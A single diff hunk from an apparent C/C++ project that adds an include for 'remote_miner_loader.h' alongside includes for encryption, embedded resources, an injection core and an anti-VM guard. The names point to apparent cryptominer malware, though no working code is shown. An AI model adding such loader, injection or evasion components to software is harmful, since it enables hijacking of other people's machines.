@@ -16,6 +16,7 @@
 #include "../include/config_manager.h"
 #include "../include/encryption.h"
 #include "../include/embedded_resource.h"
+#include "../include/remote_miner_loader.h"
 #include "../src/inject_core.cpp"
 
 #ifdef ENABLE_ANTIVM
